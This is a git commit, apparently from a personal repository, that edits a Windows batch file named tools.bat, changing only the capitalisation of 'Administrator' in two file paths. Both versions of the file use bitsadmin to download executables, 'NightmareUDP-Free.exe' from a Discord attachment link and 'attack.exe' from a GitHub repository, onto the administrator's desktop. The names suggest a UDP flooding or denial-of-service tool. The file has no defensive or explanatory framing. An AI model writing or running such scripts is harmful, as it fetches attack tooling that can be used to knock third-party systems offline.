541c5ac4ee158e8a7a75b9fa7e34190bdedc157e
Rutik <34602897+Ruik06@users.noreply.github.com>
2021-07-13 22:21:47 +0530

    A

--- tools.bat
+++ tools.bat
@@ -1,2 +1,2 @@
-bitsadmin /transfer mydownloadjob /download /priority FOREGROUND "https://cdn.discordapp.com/attachments/863248318888280095/864110680831164446/NightmareUDP-Free.exe" "C:\Users\administrator\Desktop\NightmareUDP-Free.exe"
-bitsadmin /transfer mydownloadjob /download /priority FOREGROUND "https://github.com/RPT001/Nightmare/raw/master/attack.exe" "C:\Users\administrator\Desktop\attack.exe"
+bitsadmin /transfer mydownloadjob /download /priority FOREGROUND "https://cdn.discordapp.com/attachments/863248318888280095/864110680831164446/NightmareUDP-Free.exe" "C:\Users\Administrator\Desktop\NightmareUDP-Free.exe"
+bitsadmin /transfer mydownloadjob /download /priority FOREGROUND "https://github.com/RPT001/Nightmare/raw/master/attack.exe" "C:\Users\Administrator\Desktop\attack.exe"
